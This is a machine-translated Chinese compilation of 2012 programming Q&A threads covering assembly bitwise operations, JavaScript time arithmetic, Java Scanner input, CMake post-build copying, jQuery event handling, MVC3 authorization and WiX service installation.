> 时间：2012-11-17T10:23:39.547
> 
> 标签：assembly, x86

嘿，我对 asm 有点陌生，这个问题让我整晚都无法解决，所以我希望能得到一些帮助。出于某种原因，表达

或者，11111111

当 al = AA 给我的是 EF，而不是 FF。当我尝试

xor al, 11111111

它给了我 6D 而不是 55。我不明白，因为我认为 or 方法会给我所有的，而 xor 会翻转位。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:27:56.027

11111111 是一个十进制数（1100 万、111100、111）。

您需要不同的语法来指定这是一个二进制数；或者，将其指定为十六进制数。

# javascript - 在javascript中添加两个时间变量

> ID：13429647
> 
> 赞同：1
> 
> 时间：2012-11-17T10:23:54.270
> 
> 标签：javascript

我如何在 javascript 中添加两个时间变量。

例如1：

```
var a = 17.30hrs 
var b=1.30hrs 
```

所以总数应该是`(a+b) = 19.00hrs`

示例2：

```
var a = 23:00hrs 
var b = 1.30hrs 
```

所以总数应该是`(a+b) = 00.30hrs`

在这里我们可以使用`24 hrs time format`.

在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:01:49.190

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> New Document </TITLE>
<META NAME="Generator" CONTENT="EditPlus">
<META NAME="Author" CONTENT="">
<META NAME="Keywords" CONTENT="">
<META NAME="Description" CONTENT="">
<script language="javascript">
function getTimeTotal(time1,time2)
{
var time1_hr = "";
var time1_min = "";
var time2_hr = "";
var time2_min = "";
var total_hrtime = "";
var total_mintime = "";
var generated_Hour = 0;
    time1_hr = time1.split(":")[0];
    time1_min = time1.split(":")[1];
    time2_hr = time2.split(":")[0];
    time2_min = time2.split(":")[1];

    total_hrtime = 1* time1_hr + 1*time2_hr;

    alert(total_hrtime);
    total_mintime = 1* time1_min + 1*time2_min;
    alert(total_mintime);

    if(total_mintime>=60)
    {
        total_mintime = total_mintime - 60;
        total_hrtime = total_hrtime + 1;
    }

    if(total_hrtime>=24)
    {
        total_hrtime = total_hrtime -24 ;
                if(total_hrtime<10)
    total_hrtime = "0"+total_hrtime;

    }

alert(total_hrtime+":"+total_mintime);  
}
</script>
</HEAD>

<BODY>
<input type="button" onClick="getTimeTotal('17:30','17:30');" />
</BODY>
</HTML> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:05:00.913

尝试这个，

```
var a = "17.30hrs" 
var b = "1.30hrs"

alert(addtime(a,b)); //output: 19.00hrs 

var a = "23.00hrs" 
var b = "1.30hrs"

alert(addtime(a,b)); //output: 0:30hrs

//Add two times
function addtime(start_time, end_time){
    var startArr = start_time.replace('hrs','',start_time).split('.');
    var endArr = end_time.replace('hrs','',end_time).split('.');

    var d = new Date();
    startArr[0] = (startArr[0]) ? parseInt(startArr[0], 10) : 0;
    startArr[1] = (startArr[1]) ? parseInt(startArr[1], 10) : 0;
    endArr[0] = (endArr[0]) ? parseInt(endArr[0], 10) : 0;
    endArr[1] = (endArr[1]) ? parseInt(endArr[1], 10) : 0;

    d.setHours(startArr[0] + endArr[0]);
    d.setMinutes(startArr[1] + endArr[1]);   

    var hours = d.getHours();
    var minutes = d.getMinutes();

    return hours+'.'+minutes+'hrs';
}​ 
```

**演示：http:** [//jsfiddle.net/AXVPf/5/](http://jsfiddle.net/AXVPf/5/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T11:06:25.507

这似乎有效，但前提是您使用小时和分钟：

```
var time1 = new Date('','','', 17, 30);
var time2 = new Date('','','', 01, 30);

var hours = time1.getHours() + time2.getHours();
var minutes = time1.getMinuess() + time2.getMinutes();

if ( minutes >= 60 ) 
{
    hours++;
    minutes -= 60;
}

if ( hours >= 24 ) 
{
    hours -= 24;
}

console.log ( hours );
console.log ( minutes ); 
```

在这里小提琴：http: [//jsfiddle.net/VzL7e/](http://jsfiddle.net/VzL7e/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T10:40:41.360

对于第一个例子，

```
var date = new Date();
date.setHours(17);
date.setMinutes(30);
date.setSeconds(0);

var newDate = new Date(date.getTime());
newDate.setSeconds(newDate.getSeconds() + 0);
newDate.setMinutes(newDate.getMinutes() + 30);
newDate.setHours(newDate.getHours() + 1); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-17T10:35:01.097

### 使用这个 JavaScript

```
// Declare Variables
var a = new Date(0);
var b = new Date(0);
a.setHours(23);
b.setHours(1);
b.setMinutes(30);
c = a - b;

// For Hours
hours = c / 1000 / 60 / 60;
// For Minutes
mins = c / 1000 / 60; 
```

网络上有很多可用的示例。看一下这个：

```
// Simple function to calculate time difference between 2 Javascript date objects
function get_time_difference(earlierDate,laterDate)
{
       var nTotalDiff = laterDate.getTime() - earlierDate.getTime();
       var oDiff = new Object();

       oDiff.days = Math.floor(nTotalDiff/1000/60/60/24);
       nTotalDiff -= oDiff.days*1000*60*60*24;

       oDiff.hours = Math.floor(nTotalDiff/1000/60/60);
       nTotalDiff -= oDiff.hours*1000*60*60;

       oDiff.minutes = Math.floor(nTotalDiff/1000/60);
       nTotalDiff -= oDiff.minutes*1000*60;

       oDiff.seconds = Math.floor(nTotalDiff/1000);

       return oDiff;

} 
```

以上代码取自：http: [//blogs.digitss.com/javascript/calculate-datetime-difference-simple-javascript-code-snippet/](http://blogs.digitss.com/javascript/calculate-datetime-difference-simple-javascript-code-snippet/)

# ios - 在 sharekit 中仅启用电子邮件和 facebook

> ID：13429651
> 
> 赞同：0
> 
> 时间：2012-11-17T10:24:09.607
> 
> 标签：ios, facebook, share, sharekit

我是sharekit的新手。需要一些帮助。当我单击共享按钮时，我只想启用电子邮件和 Facebook 选项。我不希望选项美味和推特等等。我该怎么做？需要一些指导...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:37:52.337

使用[ShareKit 2.0](https://github.com/ShareKit/ShareKit)

编辑`SHKSharers.plist`以仅包含您需要的共享者。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T03:32:27.600

```
favoriteSharers = [NSArray arrayWithObjects:@"SHKFacebook", @"SHKMail", nil];
return favoriteSharers; 
```

在 SHK.m 文件中的 favoriteSharersForType 函数中更改它...

# qt - 在 QGraphicsView 中移动 QGraphicsScene？

> ID：13429652
> 
> 赞同：0
> 
> 时间：2012-11-17T10:24:43.743
> 
> 标签：qt

我正在开发一个软件来显示模拟结果。我正在使用瓦片，由于地图有几百万个瓦片，我决定不使用 QGraphics 功能“绘制整个场景，只显示可见部分”，因为我读到它适用于数千个瓦片，而不是数以百万计的瓷砖。

因此，我只显示地图的可见部分（几百个图块）。它工作得很好。我在 QGraphicsScene 和 QGraphicsView 中添加 QGraphicsPixmapItem (=tiles)。

**我的问题是**：如何滚动地图？我想移动包含地图的对象（=场景），以便所有图块同时移动。我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:13:39.460

好的，我终于找到了一些有用的东西：`QGraphicsItemGroup`。
我所做的是将地图的所有图块显示为`QGraphicsItemGroup`，当我想滚动地图时，只需调用 `moveBy()`.`QGraphicsItemGroup`

所以，我有：
`QGraphicsPixmapItem`（=瓷砖）
`QGraphicsItemGroup` （=地图的容器，当我们滚动时移动）
`QGraphicsScene` （=场景）
`QGraphicsView` （=视图）

希望它有帮助;p

# java - Java：将 hasNextInt 与 do-while 循环一起使用，它在偶数时间忽略整数输入

> ID：13429655
> 
> 赞同：2
> 
> 时间：2012-11-17T10:25:17.167
> 
> 标签：java, list, add, java.util.scanner, do-while

我正在尝试自学 Java 编程，偶然发现了斯坦福提供的 CS106A 课程。这是一个很棒的免费在线课程。我看了几个[讲座视频](http://www.youtube.com/course?list=EC84A56BC7F4A1F852)，到目前为止我很喜欢。我现在正在尝试做作业，但我遇到了我自己无法解决的问题。

这是[本次作业](http://see.stanford.edu/materials/icspmcs106a/13-assignment-2-simple-java.pdf "作业 2")的第 5 号。基本上，它要求学习者创建一个控制台程序来获取用户输入的一些整数并作为响应，显示最大和最小的数字。

以下代码是我所做的，问题是当我尝试输入整数时，它会跳过偶数个输入。例如，如果我在控制台输入 3,12,6,15,9，它只会得到 3,6,9 ，而忽略 12,15。

我做错了什么？任何帮助，将不胜感激。

```
import java.util.*;

public class Ass2_5MaxMinNumbers {
    public static void main (String args[]) {
        Scanner scanner;

        System.out.println ("This programme finds the largest and smallest numbers.");
        System.out.println ("After finished entering, enter \"End\" (without double quotes) to show the results.");

        List<Integer> list = new ArrayList<Integer>();
        int max = 0, min = 0;

        do {
            scanner = new Scanner(System.in);

            if(scanner.hasNextInt()){
                int x = scanner.nextInt();
                list.add(x);
                System.out.println("user input: " + x);
            } else if(!scanner.hasNext("End")){
                System.out.println("Please enter an integer!");
            }
        } while (!scanner.hasNext("End"));

        max = list.get(0);
        min = list.get(0);
        for(int x = 1; x < list.size(); x++){
            if(list.get(x) > max){
                max = list.get(x);
            } else if(list.get(x) < min){
                min = list.get(x);
            }
        }

        System.out.println ("Smallest number: " + min);
        System.out.println ("Biggest number: " + max);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T10:31:26.533

`Scanner.nextInt`方法仅从用户传递的输入中读取下一个令牌。因此，它忽略了`linefeed`每个输入末尾的那个。并且该换行符作为下一次调用`Scanner.nextInt`的输入，因此您的输入被忽略。

`Scanner.nextLine`您可以在每次调用后使用空白`Scanner.nextInt`来使用换行符。

```
if(scanner.hasNextInt()){
    int x = scanner.nextInt();
    scanner.nextLine();  // Add a blank nextLine
    list.add(x);
    System.out.println("user input: " + x);
} 
```

* * *

或者您也可以`scanner.nextLine()`仅用于阅读`integers`，并将输入转换为`integer`使用`Integer.parseInt`。

```
if(scanner.hasNextInt()) {
    int x = 0;

    try {
         x = Integer.parseInt(scanner.nextLine());
    } catch (NumberFormatException e) {
         e.printStackTrace();
    }

    list.add(x);
    System.out.println("user input: " + x);
} 
```

实际上，由于您`scanner.hasNextInt`在 if 中使用，因此您实际上并不需要它，因此`try-catch`您`Integer.parseInt`可以将其删除。

* * *

**更新 ： -**

我会`do-while`用 a替换你的，`while`然后从里面取出`if-else`支票。

```
while (scanner.hasNextLine()) {
    String input = scanner.nextLine();

    if (input.equals("End")) {
        break;
    } else {
        try {
            int num = Integer.parseInt(input);
            list.add(num);

        } catch (NumberFormatException e) {
            System.out.println("Please Enter an Integer");
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-17T10:35:19.177

您发布的代码中的错误是您正在通过循环迭代创建一个新的 Scanner 对象。在循环之前初始化扫描仪并且您的代码可以工作：

```
 scanner = new Scanner(System.in);
    do {
      if(scanner.hasNextInt()){
            int x = scanner.nextInt();
            list.add(x);
            System.out.println("user input: " + x);
        }
        //and so on... 
```

顺便说一句 - 可以在 while 循环内计算最大值和最小值，而无需先将值存储在列表中。

感谢您提醒我注意这个免费的在线课程。

# c++ - 使用 CMake 制作后如何将目录的内容复制到构建目录中？

> ID：13429656
> 
> 赞同：91
> 
> 时间：2012-11-17T10:25:24.287
> 
> 标签：c++, cmake

我在`config`源文件旁边的目录中有一些配置文件（xml、ini、...）。每次制作项目时，如何将配置目录中的所有文件复制到构建目录（可执行文件旁边）？

* * *

## 回答 #1

> 赞同：161
> 
> 时间：2012-11-17T11:12:50.477

您可以使用[`add_custom_command`](http://www.cmake.org/cmake/help/v2.8.10/cmake.html#command:add_custom_command).

假设您的目标被称为`MyTarget`，那么您可以这样做：

```
add_custom_command(TARGET MyTarget PRE_BUILD
                   COMMAND ${CMAKE_COMMAND} -E copy_directory
                       ${CMAKE_SOURCE_DIR}/config/ $<TARGET_FILE_DIR:MyTarget>) 
```

每次构建时都会执行此操作`MyTarget`，并将“/config”的内容复制到目标 exe/lib 将结束的目录中。

正如[Mark Lakata](https://stackoverflow.com/users/364818/mark-lakata)在下面的评论中指出的那样，替换`PRE_BUILD`为`POST_BUILD`确保`add_custom_command`只有在构建成功时才会发生复制。

### 解释

*   `${CMAKE_COMMAND}`是 CMake 的路径
*   `-E`使 CMake 运行命令而不是构建
*   `copy_directory`是一个[*命令行工具*](https://cmake.org/cmake/help/latest/manual/cmake.1.html#command-line-tool-mode)
*   `config`是将其内容复制到构建目标中的目录（位于项目的根目录下）
*   `$<TARGET_FILE_DIR:MyTarget>`是一个*生成器表达式*，在`add_custom_command`文档中进行了描述。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2019-03-17T15:34:09.203

除了上面的答案，

要复制目录本身而不是内容，可以添加`/${FOLDER_NAME}`到第二个参数的末尾。

像这样：

```
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
                   COMMAND ${CMAKE_COMMAND} -E copy_directory
                       ${CMAKE_SOURCE_DIR}/config $<TARGET_FILE_DIR:${PROJECT_NAME}>/config) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-17T10:43:05.817

CMake 支持 shell 类型的文件副本。这个链接应该对你有帮助 -[如何将目录从源代码树复制到二叉树？](https://stackoverflow.com/questions/697560/how-to-copy-directory-from-source-tree-to-binary-tree)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2021-11-06T09:57:59.817

# *使用符号链接*

* * *

CMake 通过以下方式启用符号链接`create_symlink`：

```
add_custom_command(TARGET ${CMAKE_PROJECT_NAME} PRE_BUILD
                   COMMAND ${CMAKE_COMMAND} -E create_symlink
                   ${CMAKE_SOURCE_DIR}/config $<TARGET_FILE_DIR:${PROJECT_NAME}>/config) 
```

它确保当您更改目录中的文件时，构建文件夹随后将被更新。

* * *

## 回答 #5

> 赞同：-5
> 
> 时间：2012-11-17T10:46:00.767

在我的项目中，我使用 INSTALL 在 CMake 中指定使用 conf 文件移动二进制文件的内容和位置。执行 cmake 后，使用“make install”。

# android - 我可以在 Google Play 上以编程方式设置我的 Android 应用程序的价格吗？

> ID：13429659
> 
> 赞同：0
> 
> 时间：2012-11-17T10:25:45.653
> 
> 标签：android, google-play

如何以编程方式设置我的 android 应用程序的价格值。基本上我想通过谷歌播放的价格值来设置我的应用程序的价格。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:28:25.933

我认为不可能在开发控制台之外设置您的应用程序的价格，据我了解，为您的应用程序设置价格的唯一方法是在开发人员控制台中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T10:07:26.140

您可以实施应用内购买。

然后有两款应用内商品，一款全价，一款低价。然后，当他们输入正确的代码时，您就可以让他们看到价格较低的产品。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T10:39:46.827

不可能。并且不可取；先通过谷歌。听起来有点腥。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T10:29:18.047

没有公共 API 可以更改您的开发者控制台设置。

# algorithm - A* 搜索算法的最坏情况是什么？

> ID：13429661
> 
> 赞同：3
> 
> 时间：2012-11-17T10:25:47.530
> 
> 标签：algorithm, a-star

A* 搜索算法会在什么条件下探索搜索空间中的所有状态？这是最坏的情况吗？

根据我的说法，如果通往目标的路线上每个节点的 f(n) 高于同一级别的其他节点，它将被迫搜索整个搜索空间。这是最坏的情况，因为必须扩展生成的所有节点才能达到目标。

这个对吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:29:54.840

来自[维基百科](http://en.wikipedia.org/wiki/A%2a)：

> A* 的时间复杂度取决于启发式。在最坏的情况下，扩展的节点数在解的长度（最短路径）上呈指数，但是当搜索空间是一棵树，存在单一目标状态，启发式函数h满足a时，它是多项式的某些标准：

# javascript - 在 Rails 3 应用程序中进行 base64 解码而不保存在服务器上

> ID：13429665
> 
> 赞同：2
> 
> 时间：2012-11-17T10:26:27.020
> 
> 标签：javascript, ruby-on-rails, png, base64, jpeg

我有一个 Highcharts 图表，我在 Rails 3.2 应用程序中使用以下 javascript 将其从画布转换为 Base64。

```
canvg(document.getElementById('chart'), chart.getSVG())
var canvas = document.getElementById("chart");
var img = canvas.toDataURL("image/png");
document.write('<img src="'+img+'"/>'); 
```

现在，我想将该图像解码为图像文件。但是，我不想将它保存到服务器，因为唯一的目的是在 Facebook 上分享。我看到两个选项：

- 将数据从`img`回发送到服务器，然后将其转换为存储在临时文件夹中的图像，并在视图中呈现。

- 使用 javascript 将 Base64 解码为 PNG 文件并在新窗口中打开。

我应该采取哪个方向以及如何实施？我已经用谷歌搜索了几个小时，并找到了一些可以满足我需要的部分示例，但我找不到整个故事。

这个解决方案看起来很有希望，但是我的图像太大而无法使用 get 请求，而且我对 javascript 不是很熟悉，所以我尝试使用 post 请求失败了：

[使用 ruby​​ on rails 和 javascript 将画布转换为图像并在新窗口中打开](https://stackoverflow.com/questions/5403709/convert-canvas-to-image-and-open-in-new-window-using-ruby-on-rails-and-javascrip)

编辑：作为另一个潜在的解决方案，是否有一个网络工具可以发送 base64 字符串，该字符串将自动返回图像链接？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T12:46:39.303

**简而言之：**您的第一个选择是最好的

**长版：**我不确定您是否可以使用 base64 网址在 facebook 上发布 - 原因与您不能对巨大的 base64 字符串使用 GET 请求相同（它们是否支持那么长的网址？） - 所以您可能实际上*需要*保存这些图片。

我不确定，但我认为只有用户直接发布的图片（未*通过*“共享”按钮链接）保存在 Facebook 端，其他图片实际上位于您的服务器中。

首先，您应该测试是否直接通过 facebook API 发送巨大的 base64 字符串 - 我尝试使用 FB 的在线工具为小图像创建一个图形 api 元标记，但它没有用，所以这看起来不太好（虽然我承认我不太了解 FB API）。

让我们承认您必须永久保存此图像 - 通过 AJAX POST 请求将其发送到您的服务器并不难。如果您使用[JQuery](http://api.jquery.com/jQuery.post/)，它甚至非常简单。之后只需使用 ruby​​ 将 base64 转换为图像文件。

**编辑：**我只是想知道我是否很好地理解了这个问题。您只是希望您的用户能够下载创建的图像吗？如果是这样，他们只需右键单击>保存生成的图像。canvas2image[库](http://www.nihilogic.dk/labs/canvas2image/)甚至可以使“右键单击受损”用户更容易；）

**编辑 2：**这是一个带有 JQuery 的 ajax POST 请求的示例：

```
$.post( 
  // first argument : the URL you want to POST to
  'url/to/post.js',
  // second argument: the data to send to the server
  myData,
  // third argument : a callback function, 
  // that is called when the request is complete
  // and is passed the data returned by the server 
  // + response status (success, error...)
  function( data ){    
    alert('request completed, returned :' + data);
  }); 
```

所以在你的情况下，你可以做这样的事情：

```
$.post(
  '<%= create_facebook_image_path format: :js %>',
  { base_64_string: img },
  function( data ){
    $('#viewport').append( $('<img />').attr({ src: data.url }) );
  }); 
```

[JQuery 的文档](http://api.jquery.com/jQuery.post/)中提供了更多示例，包括如何处理成功/错误状态。我建议你学习使用 JQuery，你很快就会发现它是多么简单而强大！

# html - Mozilla 不会刷新音频标签文件。Mozilla 的错误音频

> ID：13429669
> 
> 赞同：1
> 
> 时间：2012-11-17T10:27:07.137
> 
> 标签：html, html5-audio

我有一个代码，它通过调用 servlet 自动生成验证码图像并将其显示在 HTML 表单中。但对于视障人士，我也想放一个音频文件。因此，我将 servlet 生成的验证码存储为字符串形式的会话属性，并从该属性再次根据验证码生成音频文件。因此，假设验证码是“猫”，则相应地生成音频文件。现在的问题是，当我在 Chrome 中刷新页面时，验证码图像和音频都会刷新，这是理想的，但在 Mozilla 中，只有图像不会刷新音频文件。

```
 <div class="formRow">
                <div class="field">
                    <img style="margin-left:91px; margin-top:-6px;" class="image" src="http:www.xyz.com/captchaServlet"> 
         //the above line calls a servlet for the image       

                </div>
                </div></br>
                 <div class="formRow">
                      <div class="field">
                      <audio style="margin-left:91px;" controls="controls">
      <source  src="http:www.xyz.com/getSound" type="audio/wav">
//the above line calls servlet for audio file
    Your browser does not support this audio format.
    </audio>
                      </div>
             </div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:33:07.183

它可能正在缓存网址。只需使用它来使 url 唯一

```
<source  src="http:www.xyz.com/getSound?rand=<?php echo rand(time()); ?>" type="audio/wav"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-20T00:17:39.297

当我尝试在功能期间更改音频标签的来源时`window.onLoad`，它不起作用。然而，当我在标签内编写脚本`body`时，它就像一个魅力。这是我使用的：

```
<script type="text/javascript">
  if(navigator.userAgent=="Mozilla/5.0 (X19; Ubuntu; Linux i697; rv:10.0) Gecko/22222222 Firefox/16.0"){
    var d = new Date();
    var n = d.getTime();
    document.getElementById("audiowav").src="http://abcd.com/getSound?rand="+n;
  }
</script> 
```

所以基本上我从@Shahil那里得到了这个想法

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-09T17:33:03.310

这是一个有趣的问题，通过解决这个错误可以获得很多学习。

首先，Mozilla Firefox 无法找出在不同实例中单击的 URL“http:abcd.com/getSound”之间的区别。例如，上午 9:30 的点击和上午 9:31 的点击对于 Firefox 没有任何区别，因为在两个实例中都请求了相同的 URL。

解决此问题的一种简单方法是在 URL 末尾包含一个唯一参数，以确保 Firefox 能够区分 Web 请求。

```
<script type="text/javascript">
  window.onload = (event) => {
    var d = new Date();
    var n = d.getTime();
    document.getElementById("audiowav").src="http://abcd.com/getSound?rand="+n;
    };
</script>
```

在加载时添加这个 JS 函数将在每次加载页面后更改 src URL，并且由于每次调用不同的 URL，浏览器不会在其缓存中找到新 URL，并将检索每个对应的正确音频文件点击。

该解决方案与@Nick Div 99% 相似，尽管我的好奇心让我深入研究了更多细节。我仍然很想知道为什么这个问题专门发生在 Firefox 中而不是其他浏览器。一旦我找到答案就会回来。

# php - Jquery Ajax .load 循环

> ID：13429672
> 
> 赞同：0
> 
> 时间：2012-11-17T10:27:55.323
> 
> 标签：php, jquery

我有个问题。下面的脚本效果不佳。问题是当我单击列表页面中的链接时，我会得到详细信息，但是当我再次单击时，他刷新 2 次，当我单击 2 次时，他刷新 4 次，依此类推。

有人可以帮我做错什么吗？

氪 BA

索引页

```
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="/admin/js/general.js"></script>

<div id="content"></div>    
<div id="contentLister"></div> 
```

Javascript general.js

```
$(document).ready(function(){
//returns LISTER
$('ul#ajaxNav li a').click(function() {
    var page = $(this).attr('href');        
    $('#content').fadeOut().load('classes/cAjaxLister.php'+ page).fadeIn();
    return false;
});

//returns Detail
$('td ul#ajaxLister li a').click(function() {
    var page = $(this).attr('href');        
    $('#contentLister').fadeOut().load('classes/cAjaxLister.php'+ page).fadeIn();

    return false;
    });     

}); 
```

列表和详细信息页面

```
 echo '<td>
        <ul id="ajaxLister" class="actions" >
        <li><a title="View" class="view" href="?action=view&item=' . $p_UrlItem . '&id=' . $resultId[0] . '">view</a></li>
        <li><a title="Edit" class="edit" href="?action=edit&item='.$resultId[0].'">edit</a></li>
        <li><a title="Delete" class="delete" href="?action=delete&item='.$resultId[0].'">delete</a></li>
        </ul>
    </td>';
    echo '</tr>'.PHP_EOL; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T17:36:35.217

我很抱歉，因为我可能对 javascript 不太了解，但问题似乎来自单击 A 标签。您需要在函数中使用`event`参数`click`，然后防止链接重定向：

```
 $(document).ready(function(){
    //returns LISTER
    $('ul#ajaxNav li a').click(function(event) {
        event.preventDefault();
        var page = $(this).attr('href');        
        $('#content').fadeOut().load('classes/cAjaxLister.php'+ page).fadeIn();
        return false;
    });

    //returns Detail
    $('td ul#ajaxLister li a').click(function(event) {
        event.preventDefault();
        var page = $(this).attr('href');        
        $('#contentLister').fadeOut().load('classes/cAjaxLister.php'+ page).fadeIn();

        return false;
        });     

    }); 
```

[http://api.jquery.com/event.preventDefault/](http://api.jquery.com/event.preventDefault/)

# android - 如何让 listview Divider 的 drawable 重用它？

> ID：13429679
> 
> 赞同：0
> 
> 时间：2012-11-17T10:28:17.890
> 
> 标签：android, listview, drawable, divider

我在我的应用程序中进行了一些调整：我的 Listview 位于 2 个 LinearLayout 之间，看起来像我的 ListView 行。

这是一个小技巧，可以让我始终显示第一个和最后一个项目

我的布局看起来像

> [线性布局]
> 
> [列表显示]
> 
> [线性布局]

我对结果很满意，除了一件事：我想在那些 LinearLayouts 和 ListView 之间插入 listview 分隔符。

我应该如何获得看起来与分隔线完全一样的可绘制（或更好的 xml 布局）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:34:12.560

您可以使用[ListView.getDivider()](http://developer.android.com/reference/android/widget/ListView.html#getDivider%28%29)根据 Android SDK 版本和主题获取列表视图使用的可绘制对象。

# html - 将文件链接到不同子目录中的 html 以摆脱 .html 或 .php 扩展名

> ID：13429682
> 
> 赞同：1
> 
> 时间：2012-11-17T10:28:46.133
> 
> 标签：html, css, hyperlink

好的，所以我最近更改了我的目录以排除 .html 扩展名。

我已经通过使用“/”链接文件，例如此处引用的“/mackbyte_files/style.css”[如何链接相同或不同文件夹中的html页面？](https://stackoverflow.com/questions/908765/how-to-link-html-pages-in-same-or-different-folders)

一旦所有文件都上传到服务器，这工作正常，但是当我打开计算机目录上的 index.html 页面时，所有 css 和链接文件都没有显示。

有没有一种方法可以两全其美，这样我就可以在本地对页面进行更改并查看它们以测试更改等，然后上传它们？

谢谢

# asp.net-mvc-3 - 在 MVC3 中，如何通过基于角色的授权来限制对区域的访问？

> ID：13429684
> 
> 赞同：1
> 
> 时间：2012-11-17T10:29:17.323
> 
> 标签：asp.net-mvc-3, controller, authorization, asp.net-mvc-areas, role-base-authorization

在 MVC3 中，我们可以使用 [Authorize] 属性限制对控制器的访问，指定用户必须具有管理员角色才能访问类中的任何控制器操作，如下例所示...

```
[Authorize(Roles = "Administrator")]
public class MyDefaultController : Controller
{
    // Controller code here
} 
```

但是，如何限制对 MVC3 中整个区域的访问，而不为区域内的每个控制器类指定 [Authorize] 属性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:12:54.173

您可以使用 RouteConstraints 来执行此操作：

写一个这样的类：

```
 public class AreaRouteConstraint : IRouteConstraint
        {
            public bool Match(HttpContextBase httpContext, Route route, string parameterName, RouteValueDictionary values, RouteDirection routeDirection)
            {
                return  Validate(values["area"];

            }
       } 
```

实施`Validate`方法取决于您。

并像这样使用它：

```
 routes.MapRoute(
name: "yourRouteName",
url: "Url",
defaults: new { controller = "controller", action = "action" , area="area" },
constraints: new AreaRouteConstraint ()
); 
```

# c# - 如何更改 Bing 地图（图块）的设计？

> ID：13429688
> 
> 赞同：0
> 
> 时间：2012-11-17T10:29:49.953
> 
> 标签：c#, wpf, bing-maps

我正在寻找一种在我的 WPF 应用程序中使用 Bing 地图的便捷方法，但我似乎无法弄清楚如何创建自己的设计以及如何实现它。我想更改所有颜色等，就像您可以使用 Google Maps 地图编辑器一样。

有没有一种工具可以用来设计自己的视觉风格并将其导出（以便我可以离线使用）？

亲切的问候，尼尔斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T07:06:56.983

Bing 当前没有样式化的地图服务，Bing 或 Google 的许可协议都不允许您下载切片以供离线使用。

我建议您查看 cloudmade.com，它确实提供样式化的地图并允许下载图块。然后，您将需要另一个 wpf 地图控件，但在 google 上查看一下，有许多项目

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T19:03:58.400

Gingemonster 是对的。我使用 CloudMade 设计了自己的样式，它会为您提供样式 ID 和 API 密钥以及可用于获取图块的特定 URL。

然后我使用了本主题中给出的代码： [Load custom tiles in Bing maps on WPF](https://stackoverflow.com/questions/11747160/load-custom-tiles-in-bing-maps-on-wpf)

效果很好:)，谢谢尼尔斯

# php - 如何为 GET 准备字符串

> ID：13429696
> 
> 赞同：1
> 
> 时间：2012-11-17T10:30:35.430
> 
> 标签：php, json, get

我正在编写将用作两台服务器之间通信的 API。我通过 Curl 和 json 使用 GET。

我的客户正在发送用户代理，例如

> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:15.0) Gecko/20100101 Firefox/15.0.1

如何通过 GET 请求发送这样的字符串？我想我需要以某种方式对其进行清理或以某种可以在服务器端转换为原始格式的格式进行加密。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T10:32:06.067

我猜你正在寻找[`urlencode()`](http://php.net/urlencode) 和[`urldecode()`](http://php.net/urldecode)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:42:05.743

如果您希望您的 CURL 请求包含自定义标头，您可以使用`curl_setopt`带有`CURLOPT_HEADER`选项的函数来规定您的自定义用户代理，请参阅

[http://www.php.net/manual/en/function.curl-setopt.php](http://www.php.net/manual/en/function.curl-setopt.php)

（当你有一个更传统的地方时，我真的不明白有什么理由尝试将这种数据作为 GET 参数传输。如果你正在编写 API，你最好坚持一些基本的做法事物 ：） ）

# windows-services - 使用 WiX 从现有文件安装服务

> ID：13429698
> 
> 赞同：2
> 
> 时间：2012-11-17T10:30:41.210
> 
> 标签：windows-services, wix, windows-installer, wix3.6

我知道如何安装 .exe 文件，安装相应的 Windows 服务并启动它。

我不知道如何从用户计算机上的**现有文件安装服务。**我不想再次复制 .exe，它已经在用户的机器上。

具体来说，我认为我应该使用*ServiceInstall*，但是如何指定 .exe 文件？

我正在使用 WiX 3.6。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T14:55:21.230

我认为这个问题的答案是“使用 Windows Installer 标准功能是不可能的”。与往常一样，替代方法是自定义操作，但这不是我建议您采用的路径。

看，Windows Installer（因此，WiX）能够以两种主要方式使用服务：

*   安装一个新服务（当然是未安装的）
*   配置现有服务

在后一个选项中，服务应该安装到系统上，即应该存在于服务管理控制台中。MSI 包将启动/停止它，等等。

